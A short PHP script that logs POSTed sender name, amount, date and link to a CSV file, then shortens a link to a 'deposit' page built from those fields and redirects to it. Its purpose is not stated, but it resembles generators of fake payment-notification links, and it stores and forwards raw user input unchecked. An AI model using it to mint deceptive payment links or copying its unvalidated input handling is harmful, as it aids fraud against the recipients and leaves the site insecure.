<?php
$sender_name = $_POST['sender_name'];
$amount = $_POST['amount'];
$date = $_POST['date'];
$link = $_POST['link'];

$data = array($sender_name, $amount, $date, $link);
$file = fopen('/data.csv', 'a');
fputcsv($file, $data);
fclose($file);

$url = 'https://is.gd/create.php?format=simple&url=' . urlencode('http://' . $_SERVER['HTTP_HOST'] . '/public/deposit/indexx.php?' . http_build_query($_POST));
$short_url = file_get_contents($url);

header('Location: example2.php?url=' . $short_url);
?>
